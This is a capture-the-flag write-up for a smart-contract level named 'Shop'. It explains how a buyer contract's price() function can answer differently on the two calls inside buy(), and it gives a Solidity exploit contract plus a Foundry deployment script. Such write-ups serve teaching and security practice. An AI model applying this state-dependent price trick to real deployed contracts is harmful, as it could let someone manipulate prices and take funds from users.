# Shop   
The objective of this challenge is to set the `price` to a value lower than 100. The only function available is `buy()`, which sets the caller as the `Buyer`. The key to solving this challenge lies in manipulating the `price()` function to return different values based on the state of the contract.

The `buy()` function interacts with the `Buyer` contract by calling its `price()` function. The price is updated only if the returned value is greater than or equal to the current price and the item hasn’t been sold yet (`!isSold`). However, the `price()` function is called twice:
    First Call: To check if the `price` is valid (`_buyer.price() >= price`).
    Second Call: To update the `price` (`price = _buyer.price()`).

This behavior allows us to exploit the state change between the two calls.
Exploitation Strategy

1. Implement a Malicious `price()` Function: We can create a contract that implements the `Buyer` interface and returns different values based on the state of the `Shop` contract.
2. Return a High Price First: During the first call, return 100 to pass the initial check.
3. Return a Low Price Second: During the second call, return 0 (or any value lower than 100) to set the `price` to a lower value.

I created a smart contract and a script to automate the exploitation process:
  
Solving.sol:   
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IShop {
    function isSold() external view returns (bool);
}

contract Solving {
    address victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function solve() external {
        victim.call(abi.encodeWithSignature("buy()"));
    }

    function price() external view returns (uint256) {
        if (!IShop(victim).isSold()) {
            return 100;
        }
        return 0;
    }
}

```
SolvingScript.s.sol:   
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";
import {Solving} from "src/Solving.sol";

contract SolvingScript is Script {

    address victim = ; // Your instance address

    function run() external {
        vm.startBroadcast();
        Solving solving = new Solving(victim);
        solving.solve();
        vm.stopBroadcast();
    }
}
```
